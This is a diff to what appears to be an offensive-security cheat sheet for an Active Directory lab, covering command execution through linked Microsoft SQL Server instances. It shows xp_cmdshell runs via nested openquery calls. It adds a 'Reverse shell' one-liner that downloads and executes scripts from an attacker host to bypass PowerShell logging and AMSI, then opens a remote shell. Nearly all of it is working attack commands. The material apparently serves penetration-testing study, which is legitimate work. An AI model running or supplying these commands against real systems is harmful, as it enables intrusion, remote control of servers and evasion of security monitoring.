@@ -2168,6 +2168,7 @@ Executing Commands
   - `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
 - OS commands can be executed using nested link queries from the initial SQL server
   - `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`
+  - Reverse shell: `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://<IP>/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://<IP>/amsibypass.txt);iex (iwr -UseBasicParsing http://<IP>/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql33`
 
 ## MDE - EDR
 
